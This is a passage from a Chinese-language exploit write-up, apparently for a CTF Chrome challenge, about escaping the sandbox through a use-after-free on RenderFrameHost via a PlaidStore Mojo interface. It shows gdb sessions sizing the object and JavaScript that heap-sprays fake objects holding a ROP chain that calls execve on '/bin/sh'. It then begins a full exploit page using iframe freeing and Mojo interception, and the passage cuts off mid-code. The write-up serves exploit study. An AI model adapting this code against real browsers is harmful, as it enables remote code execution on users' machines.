&quot;RenderFrameHostImpl::RenderFrameHostImpl&quot;:</span><br><span class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line">0x0000000003b21d80  content::RenderFrameHostImpl::RenderFrameHostImpl(content::SiteInstance*, scoped_refptr&lt;content::RenderViewHostImpl&gt;, content::RenderFrameHostDelegate*, content::FrameTree*, content::FrameTreeNode*, int, int, bool)</span><br><span class="line">0x0000000003b21d80  content::RenderFrameHostImpl::RenderFrameHostImpl(content::SiteInstance*, scoped_refptr&lt;content::RenderViewHostImpl&gt;, content::RenderFrameHostDelegate*, content::FrameTree*, content::FrameTreeNode*, int, int, bool)</span><br><span class="line">gdb-peda$ b content::RenderFrameHostImpl::RenderFrameHostImpl</span><br><span class="line">Breakpoint 1 at 0x3b21d84</span><br><span class="line">...</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Thread 1 &quot;chrome&quot; hit Breakpoint 1, 0x0000555559075d84 in content::RenderFrameHostImpl::RenderFrameHostImpl(content::SiteInstance*, scoped_refptr&lt;content::RenderViewHostImpl&gt;, content::RenderFrameHostDelegate*, content::FrameTree*, content::FrameTreeNode*, int, int, bool) ()</span><br><span class="line"></span><br><span class="line">gdb-peda$ bt</span><br><span class="line">#0  0x0000555559075d84 in content::RenderFrameHostImpl::RenderFrameHostImpl(content::SiteInstance*, scoped_refptr&lt;content::RenderViewHostImpl&gt;, content::RenderFrameHostDelegate*, content::FrameTree*, content::FrameTreeNode*, int, int, bool) ()</span><br><span class="line">#1  0x0000555559075a96 in content::RenderFrameHostFactory::Create(content::SiteInstance*, scoped_refptr&lt;content::RenderViewHostImpl&gt;, content::RenderFrameHostDelegate*, content::FrameTree*, content::FrameTreeNode*, int, int, bool) ()</span><br><span class="line">...</span><br><span class="line">gdb-peda$ b content::RenderFrameHostFactory::Create</span><br><span class="line">Breakpoint 2 at 0x5555590759e4</span><br><span class="line">gdb-peda$ r &#x2F;&#x2F; 重新运行</span><br><span class="line">Thread 1 &quot;chrome&quot; hit Breakpoint 2, 0x00005555590759e4 in content::RenderFrameHostFactory::Create(content::SiteInstance*, scoped_refptr&lt;content::RenderViewHostImpl&gt;, content::RenderFrameHostDelegate*, content::FrameTree*, content::FrameTreeNode*, int, int, bool) ()</span><br><span class="line">...</span><br><span class="line">单步执行</span><br><span class="line">   0x555559075a52 &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+114&gt;:mov    edi,0xc28 &#x2F;&#x2F;可以看出大小是0xc28</span><br><span class="line">   0x555559075a57 &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+119&gt;:call   0x55555ac584b0 &lt;_ZnwmRKSt9nothrow_t&gt;</span><br><span class="line">   0x555559075a5c &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+124&gt;:mov    rdi,rax</span><br><span class="line">   0x555559075a5f &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+127&gt;:mov    rax,QWORD PTR [r14]</span><br><span class="line">   0x555559075a62 &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+130&gt;:mov    QWORD PTR [rbp-0x38],rax</span><br><span class="line">   0x555559075a66 &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+134&gt;:mov    QWORD PTR [r14],0x0</span><br><span class="line">   0x555559075a6d &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+141&gt;:sub    rsp,0x8</span><br><span class="line">   0x555559075a71 &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+145&gt;:movzx  eax,BYTE PTR [rbp+0x20]</span><br><span class="line">   0x555559075a75 &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+149&gt;:lea    rdx,[rbp-0x38]</span><br><span class="line">   0x555559075a79 &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+153&gt;:mov    r14,rdi</span><br><span class="line">   0x555559075a7c &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+156&gt;:mov    rsi,rbx</span><br><span class="line">   0x555559075a7f &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+159&gt;:mov    rcx,r13</span><br><span class="line">   0x555559075a82 &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+162&gt;:mov    r8,r12</span><br><span class="line">   0x555559075a85 &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+165&gt;:mov    r9,r15</span><br><span class="line">   0x555559075a88 &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+168&gt;:push   rax</span><br><span class="line">   0x555559075a89 &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+169&gt;:mov    eax,DWORD PTR [rbp+0x18]</span><br><span class="line">   0x555559075a8c &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+172&gt;:push   rax</span><br><span class="line">   0x555559075a8d &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+173&gt;:mov    eax,DWORD PTR [rbp+0x10]</span><br><span class="line">&#x3D;&gt; 0x555559075a90 &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+176&gt;:push   rax</span><br><span class="line">   0x555559075a91 &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+177&gt;:</span><br><span class="line">    call   0x555559075d80 &lt;_ZN7content19RenderFrameHostImplC2EPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib&gt;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">可以看出call的两个函数分别为new和RenderFrameHostImpl的构造函数</span><br><span class="line">sakura@ubuntu:~&#x2F;mojo$ c++filt _ZN7content19RenderFrameHostImplC2EPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib</span><br><span class="line">content::RenderFrameHostImpl::RenderFrameHostImpl(content::SiteInstance*, scoped_refptr&lt;content::RenderViewHostImpl&gt;, content::RenderFrameHostDelegate*, content::FrameTree*, content::FrameTreeNode*, int, int, bool)</span><br><span class="line"></span><br><span class="line">sakura@ubuntu:~&#x2F;mojo$ c++filt _ZnwmRKSt9nothrow_t</span><br><span class="line">operator new(unsigned long, std::nothrow_t const&amp;)</span><br></pre></td></tr></table></figure><p>我们可以直接拿之前获取的remote来调storeData，并在data里fake好gadaget和数据，还是刚刚的那个图。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> uaf_ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(kRenderFrameHost);</span><br><span class="line"><span class="keyword">var</span> uaf_ta = <span class="keyword">new</span> BigUint64Array(uaf_ab);</span><br><span class="line">uaf_ta[<span class="number">0</span>] = BigInt(iframe_render_frame_host_addr)+<span class="number">0x10n</span>;</span><br><span class="line">uaf_ta[<span class="number">1</span>] = <span class="number">0n</span>;</span><br><span class="line">uaf_ta[<span class="number">2</span>] = <span class="number">0n</span>; <span class="comment">//use by pop rbp</span></span><br><span class="line">uaf_ta[<span class="number">3</span>] = BigInt(pop_rdi_ret);</span><br><span class="line">uaf_ta[<span class="number">4</span>] = BigInt(iframe_render_frame_host_addr)+<span class="number">0x10n</span>+<span class="number">0x160n</span>+<span class="number">8n</span>;</span><br><span class="line">uaf_ta[<span class="number">5</span>] = BigInt(pop_rsi_ret);</span><br><span class="line">uaf_ta[<span class="number">6</span>] = BigInt(<span class="number">0</span>);</span><br><span class="line">uaf_ta[<span class="number">7</span>] = BigInt(pop_rdx_ret);</span><br><span class="line">uaf_ta[<span class="number">8</span>] = BigInt(<span class="number">0</span>);</span><br><span class="line">uaf_ta[<span class="number">9</span>] = BigInt(pop_rax_ret);</span><br><span class="line">uaf_ta[<span class="number">10</span>] = BigInt(<span class="number">59</span>);</span><br><span class="line">uaf_ta[<span class="number">11</span>] = BigInt(syscall);</span><br><span class="line">uaf_ta[(<span class="number">0x10</span>+<span class="number">0x160</span>)/<span class="number">8</span>] = BigInt(xchg);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> uaf_uint8 = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(uaf_ab); <span class="comment">// /bin/sh\x00</span></span><br><span class="line">uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">0</span>] = <span class="number">0x2f</span>;</span><br><span class="line">uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">1</span>] = <span class="number">0x62</span>;</span><br><span class="line">uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">2</span>] = <span class="number">0x69</span>;</span><br><span class="line">uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">3</span>] = <span class="number">0x6e</span>;</span><br><span class="line">uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">4</span>] = <span class="number">0x2f</span>;</span><br><span class="line">uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">5</span>] = <span class="number">0x73</span>;</span><br><span class="line">uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">6</span>] = <span class="number">0x68</span>;</span><br><span class="line">uaf_uint8[<span class="number">0x10</span>+<span class="number">0x160</span>+<span class="number">8</span>+<span class="number">7</span>] = <span class="number">0x00</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"heap spray"</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; try_size; i++)&#123; <span class="comment">//heap spray</span></span><br><span class="line">    <span class="comment">//await ptr.storeData('1', new Array(kRenderFrameHost).fill(0x32));</span></span><br><span class="line">    <span class="keyword">await</span> ptr.storeData(<span class="string">""</span>+i, <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(uaf_ab));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-22-160738.jpg" alt=""></p><p><strong>值得提到的一点是</strong>，虽然我们为storeData传入的是一个TypedArray，并在其ArrayBuffer里伪造了数据，但最终我们传到browser侧的实例里的storeData函数的仍然仅仅是一个<code>vector&lt;uint8_t&gt;</code>，ArrayBuffer里伪造的数据就是vector的内容。</p><p>这里我们使用一个Array一样可以占位，演示如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">修改代码为await ptr.storeData(&#39;1&#39;, new Array(kRenderFrameHost).fill(0x32));</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">[0922&#x2F;095837.359069:INFO:CONSOLE(159)] &quot;heap spray&quot;, source: http:&#x2F;&#x2F;localhost:8000&#x2F;trigger.html (159)</span><br><span class="line"></span><br><span class="line">Thread 1 &quot;chrome&quot; received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x3232323232323232 (&#39;22222222&#39;)</span><br></pre></td></tr></table></figure><p>可以看出从我们伪造的<code>render_frame_host_</code>里取出到rax的vtable entry是<code>0x3232323232323232</code>，和我们保存在array里的数据是完全一致的。<br>所以这里使用ArrayBuffer和TypedArray仅仅只是为了书写便利，没有额外的原因。</p><ul><li>父子iframe之间的通信</li></ul><p>最后需要提到的一点是，由于我们需要劫持rsp到被释放的<code>render_frame_host_</code>上，而这个<code>render_frame_host_</code>在我们的这个exploit里是child iframe的<code>render_frame_host_</code></p><p>所以就要在child iframe里调用oob函数来leak出<code>render_frame_host_</code>，而不是在parent里，这样就涉及到如何将child iframe里leak出来的地址传给parent。</p><p>这里我采用的方法是将leak出来的地址作为一个新的dom节点插入进去，然后在free掉child iframe之前，在parent里，通过<code>window.frames[0].window.document.getElementById</code>的方式拿到child iframe的window，也就是拿到里面的所有dom节点，从而拿到在child iframe里leak出来的地址。</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-22-171201.png" alt=""></p><h3 id="完整exploit"><a href="#完整exploit" class="headerlink" title="完整exploit"></a>完整exploit</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;script src=<span class="string">"./mojo/public/js/mojo_bindings.js"</span>&gt;&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">    &lt;script src="./</span>third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js<span class="string">"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">      function gc() &#123; for (let i = 0; i &lt; 0x10; i++) &#123; new ArrayBuffer(0x1000000); &#125; &#125;</span></span><br><span class="line"><span class="string">      var f64 = new Float64Array(1);</span></span><br><span class="line"><span class="string">      var u32 = new Uint32Array(f64.buffer);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      function d2u(v) &#123;</span></span><br><span class="line"><span class="string">          f64[0] = v;</span></span><br><span class="line"><span class="string">          return u32;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      function u2d(lo, hi) &#123;</span></span><br><span class="line"><span class="string">          u32[0] = lo;</span></span><br><span class="line"><span class="string">          u32[1] = hi;</span></span><br><span class="line"><span class="string">          return f64[0];</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      </span></span><br><span class="line"><span class="string">      function b2i(bytes)&#123;</span></span><br><span class="line"><span class="string">          var value = 0;</span></span><br><span class="line"><span class="string">          for(var i = 0; i &lt; 8; i++)&#123;</span></span><br><span class="line"><span class="string">              value = value * 0x100 + bytes[7-i];</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">          return value;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      function hex(i)&#123;</span></span><br><span class="line"><span class="string">          return '0x' + i.toString(16);</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      // for child</span></span><br><span class="line"><span class="string">      function r2p_rfh(render_frame_host_addr)&#123;</span></span><br><span class="line"><span class="string">        addElement(render_frame_host_addr,"</span>render_frame_host_addr<span class="string">");</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      function r2p_code_base(code_base)&#123;</span></span><br><span class="line"><span class="string">        addElement(code_base, "</span>code_base<span class="string">");</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      function addElement(value, id) &#123;</span></span><br><span class="line"><span class="string">        // 创建一个新的 div 元素</span></span><br><span class="line"><span class="string">        let newDiv = document.createElement("</span>div<span class="string">"); </span></span><br><span class="line"><span class="string">        newDiv.setAttribute("</span>id<span class="string">", id);</span></span><br><span class="line"><span class="string">        let newContent = document.createTextNode(value); </span></span><br><span class="line"><span class="string">        // 添加文本节点 到这个新的 div 元素</span></span><br><span class="line"><span class="string">        newDiv.appendChild(newContent); </span></span><br><span class="line"><span class="string">        // 将这个新的元素和它的文本添加到 DOM 中</span></span><br><span class="line"><span class="string">        document.body.appendChild(newDiv); </span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      function allocateRFH(src) &#123;</span></span><br><span class="line"><span class="string">        var iframe = document.createElement("</span>iframe<span class="string">");</span></span><br><span class="line"><span class="string">        iframe.src = src;</span></span><br><span class="line"><span class="string">        document.body.appendChild(iframe);</span></span><br><span class="line"><span class="string">        return iframe;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      function freeRFH(iframe) &#123;</span></span><br><span class="line"><span class="string">        document.body.removeChild(iframe);</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      var kPwnInterfaceName = "</span>pwn<span class="string">";</span></span><br><span class="line"><span class="string">      function sendPtr() &#123;</span></span><br><span class="line"><span class="string">        var pipe = Mojo.createMessagePipe();</span></span><br><span class="line"><span class="string">        // bind the PlaidStore with the child rfh</span></span><br><span class="line"><span class="string">        Mojo.bindInterface(blink.mojom.PlaidStore.name,</span></span><br><span class="line"><span class="string">          pipe.handle1, "</span>context<span class="string">", true);</span></span><br><span class="line"><span class="string">        // pass the endpoint handle to the parent rfh</span></span><br><span class="line"><span class="string">        Mojo.bindInterface(kPwnInterfaceName, pipe.handle0, "</span>process<span class="string">");</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      function getFreedPtr() &#123;</span></span><br><span class="line"><span class="string">        return new Promise(function (resolve, reject) &#123;</span></span><br><span class="line"><span class="string">          // create child iframe, allocate new RenderFrameHost</span></span><br><span class="line">          var frame = allocateRFH(window.location.href + "#child"); // designate the child by hash</span><br><span class="line">          <span class="comment">// intercept bindInterface calls for this process to accept the handle from the child</span></span><br><span class="line">          <span class="keyword">let</span> interceptor = <span class="keyword">new</span> MojoInterfaceInterceptor(kPwnInterfaceName, <span class="string">"process"</span>);</span><br><span class="line">          interceptor.oninterfacerequest = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// e is MojoInterfaceRequestEvent</span></span><br><span class="line">            interceptor.stop();</span><br><span class="line">            <span class="comment">// bind the remote</span></span><br><span class="line">            <span class="keyword">var</span> plaid_store_ptr = <span class="keyword">new</span> blink.mojom.PlaidStorePtr(e.handle);</span><br><span class="line">            <span class="comment">// get child iframe render_frame_host_addr</span></span><br><span class="line">            <span class="comment">// console.log(window.frames[0].window.document.getElementById('render_frame_host_addr').innerText);</span></span><br><span class="line">            <span class="comment">// console.log(window.frames[0].window.document.getElementById('code_base').innerText);</span></span><br><span class="line">            iframe_render_frame_host_addr = <span class="built_in">parseInt</span>(<span class="built_in">window</span>.frames[<span class="number">0</span>].window.document.getElementById(<span class="string">'render_frame_host_addr'</span>).innerText);</span><br><span class="line">            code_base = <span class="built_in">parseInt</span>(<span class="built_in">window</span>.frames[<span class="number">0</span>].window.document.getElementById(<span class="string">'code_base'</span>).innerText);</span><br><span class="line">            freeRFH(frame);</span><br><span class="line">            resolve(plaid_store_ptr);</span><br><span class="line">          &#125;</span><br><span class="line">          interceptor.start();</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// for #child</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">window</span>.location.hash == <span class="string">"#child"</span>) &#123;</span><br><span class="line">          <span class="keyword">await</span> oob();</span><br><span class="line">          sendPtr();</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// for #parent</span></span><br><span class="line">        iframe_render_frame_host_addr = <span class="number">0</span>;</span><br><span class="line">        code_base = <span class="number">0</span></span><br><span class="line">        <span class="keyword">var</span> try_size = <span class="number">100</span>;</span><br><span class="line">        <span class="keyword">var</span> kRenderFrameHost = <span class="number">0xc28</span>;</span><br><span class="line">        <span class="keyword">let</span> ptr = <span class="keyword">await</span> getFreedPtr();<span class="comment">// free iframe </span></span><br><span class="line">        <span class="comment">// leak addr</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'code_base2 is: '</span>, hex(code_base));</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'render_frame_host_addr2 is: '</span>, hex(iframe_render_frame_host_addr));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> xchg = code_base+<span class="number">0x880dee8</span>; <span class="comment">// xchg rsp, rax; clc; pop rbp; ret;</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"xchg gadget: "</span>, xchg);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> pop_rdi_ret = code_base+<span class="number">0x2e4630f</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'pop_rdi_ret: '</span>, pop_rdi_ret);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> pop_rsi_ret = code_base+<span class="number">0x2d278d2</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'pop_rsi_ret: '</span>, pop_rsi_ret);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> pop_rdx_ret = code_base+<span class="number">0x2e9998e</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'pop_rdx_ret: '</span>, pop_rdx_ret);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> pop_rax_ret = code_base+<span class="number">0x2e651dd</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'pop_rax_ret: '</span>, pop_rax_ret);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> syscall = 